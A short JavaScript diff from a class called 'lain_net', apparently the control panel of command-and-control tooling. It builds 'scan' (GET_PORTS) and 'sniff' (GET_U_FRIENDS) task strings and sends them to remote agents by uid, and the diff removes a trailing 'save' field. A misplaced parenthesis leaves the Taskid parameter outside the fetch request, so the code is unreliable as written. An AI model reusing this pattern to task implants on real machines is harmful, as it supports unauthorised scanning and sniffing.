@@ -1596,9 +1596,9 @@ class lain_net{
         }
 
         if(optionValue === "scan"){
-            var cmd="GET_PORTS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue+"*//*save";
+            var cmd="GET_PORTS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
         }else if(optionValue === "sniff"){
-            var cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue+"*//*save";
+            var cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
         }
         await fetch(this.server+"/`+web_route+`?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd))+"&Taskid=scanTask";
     }
